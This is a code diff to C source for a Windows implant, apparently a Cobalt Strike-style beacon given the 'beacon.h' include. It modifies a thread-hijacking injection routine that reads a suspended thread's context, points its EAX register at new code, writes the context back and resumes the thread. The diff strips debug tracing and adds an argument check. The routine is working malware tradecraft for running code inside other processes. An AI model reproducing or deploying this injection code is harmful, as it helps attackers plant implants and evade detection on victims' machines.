@@ -1,11 +1,9 @@
 #include <stdlib.h>
 #include <stdio.h>
-#include <string.h>
 #include <windows.h>
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
-#include "x86trace.h"
 
 /*
 * SetThreadContext / ResumeThread
@@ -63,40 +61,25 @@ BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVO
 BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
 	CONTEXT ctx;
 
+	/* not going to work; x86 -> *, we can't pass arguments this way */
+	if (lpParameter != NULL)
+		return FALSE;
+
 	/* probably not going to work, not going to be able to update thread context */
 	if (!injctx->sameArch)
 		return FALSE;
 
-	/*
-	 * x86 RtlUserThreadStart calls EAX; there is no register for lpParameter.
-	 * A remote RWX stub (VirtualAllocEx) on a CREATE_SUSPENDED process hung
-	 * the beacon thread. Ignore the thread argument and hijack EAX the same
-	 * way screenshot does. Job args still live in the mirrored payload.
-	 */
-	(void)lpParameter;
-	x86_bc("G");
-
 	/* try to query some information about our thread */
 	ctx.ContextFlags = CONTEXT_INTEGER;
-	if (!GetThreadContext(injctx->hThread, &ctx)) {
-		x86_bc("g");
+	if (!GetThreadContext(injctx->hThread, &ctx))
 		return FALSE;
-	}
 
 	/* update the Eax value to our new start address */
-	ctx.Eax = (DWORD)(DWORD_PTR)lpStartAddress;
-	if (!SetThreadContext(injctx->hThread, &ctx)) {
-		x86_bc("s");
+	ctx.Eax = (DWORD)lpStartAddress;
+	if (!SetThreadContext(injctx->hThread, &ctx))
 		return FALSE;
-	}
-	x86_bc("H");
 
 	/* kick off the thread, please */
-	if (ResumeThread(injctx->hThread) == (DWORD)-1) {
-		x86_bc("r");
-		return FALSE;
-	}
-	x86_bc("I");
-	return TRUE;
+	return ResumeThread(injctx->hThread) != -1;
 }
 #endif
